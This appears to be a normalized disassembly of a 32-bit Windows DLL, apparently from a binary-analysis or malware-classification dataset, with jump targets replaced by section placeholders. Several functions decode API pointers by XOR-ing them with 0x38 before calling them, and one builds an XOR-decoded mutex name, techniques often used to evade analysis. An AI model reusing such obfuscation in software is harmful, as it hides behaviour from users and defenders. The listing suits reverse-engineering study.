cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1001e1ec
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_10039e87
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10051390
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_100171f8
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10024aa0
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_1001c5c0
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10024aa0
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10039dd0
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
add edi 0x2
call sub_1001e1ec
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_10024aa0
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10039dd0
mov ecx esi
call sub_1001e1ec
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_10039e87
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10024aa0
test edi edi
je r-xdata
mov ecx esi
call sub_1001e1ec
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_100171f8
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10051390
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_10024aa0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_1001c5c0
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_100171f8
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_10024aa0
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_1001e1bc
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10039dd0
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1001e1bc
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x16c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10039dd0
inc [ ebp - 0x17c ]
mov ecx esi
call sub_1001e1bc
sub_1001deb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fa88
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xec ] bl
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_1005d8e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xc0 ] ebx
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] ebx
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] ebx
sub_1001df4d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_100088e0
add esp 0xc
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov ecx [ ecx ]
pop ebp
retn 0xc
sub_1001df90
push ebp
mov ebp esp
push 0xffffffff
push sub_10081f3c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi edx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] ecx
call sub_100642c0
lea edi [ esi + 0x70 ]
mov eax 0x7
xor ebx ebx
xor edx edx
mov [ edi + 0x14 ] eax
mov [ edi + 0x10 ] ebx
mov [ edi ] dx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0x90 ] ebx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ebx
mov [ esi + 0x94 ] ax
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xbc ] ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10065520
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ rw-data ]
push ebx
push 0x80
push 0x4
push ebx
push ebx
mov [ ebp - 0x30 ] ecx
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push 0x60000000
push edi
call [ ebp - 0x30 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x34 ]
push ebx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x3c ]
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
lea eax [ ebp - 0x38 ]
push eax
push ecx
push edx
push edi
call [ ebp - 0x30 ]
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push edi
call [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
xor ecx ecx
cmp [ ebp - 0x38 ] edx
sete cl
mov [ esi + 0x8 ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x30 ] eax
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x2c ]
call sub_1005e3c0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0xb4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10031f20
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edi [ eax + 0x2 ]
sub_1001e162
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100096ad
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_1007b220
sub_1001e1bc
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1005cffa
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1001e1ec
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1005b4e0
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1001e280
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fe01
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x24
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x24
jmp r-xdata
push 0xffffffff
push ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] ax
call sub_1001c310
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ edi + 0x20 ]
mov [ esi + 0x20 ] edx
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_1001e2fc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1002050e
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10016390
add esi 0x24
cmp esi edi
jne r-xdata
sub_1001e330
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc7
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push eax
mov [ ebp - 0x8 ] ax
call [ CreateMutexW@IAT ]
mov [ esi + 0x20 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0xbd
call sub_1000a6f0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x4c ]
mov eax 0x117
mov [ edi ] 0x0
call sub_1000a6f0
mov edx [ esi + 0x20 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
ja r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0xf7
call sub_1000a6f0
cmp eax 0xffffffff
je r-xdata
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x96
lea edx [ ebp - 0x74 ]
mov eax 0x58
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0xfe
jmp r-xdata
test eax eax
je r-xdata
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0x8e
call sub_1000a6f0
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp eax 0x80
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xb6
call sub_1000a6f0
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001e46f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_1001e4c0
push ebp
mov ebp esp
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x1c
test [ ecx + esi + 0xc ] 0x6
jne r-xdata
mov eax esi
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
call eax
mov eax [ ebp - 0x14 ]
cdq
add eax [ ebp - 0x1c ]
adc edx [ ebp - 0x18 ]
cmp eax [ r--data ]
jne r-xdata
cmp edx [ r--data ]
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_10007bc0
sub_1001e540
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
xor ebx ebx
push edi
mov edi 0x1
cmp eax ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
push ebx
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] ebx
mov eax edi
pop edi
mov [ esi + 0x94 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x90 ] ebx
sub_1001e5b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_10078ac0
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10062fc5
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
test edi edi
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_10024496
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_10024496
add esp 0x14
test eax eax
jle r-xdata
add [ ebp - 0x8 ] eax
inc edi
sub ebx eax
jne r-xdata
add [ ebp + 0x8 ] eax
add ebx 0x2
dec edi
jne r-xdata
sub_1001e654
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_10054678
call sub_10012991
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_1001742d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_1001f268 ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_100551f3
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_100793fd
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_100793fd
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
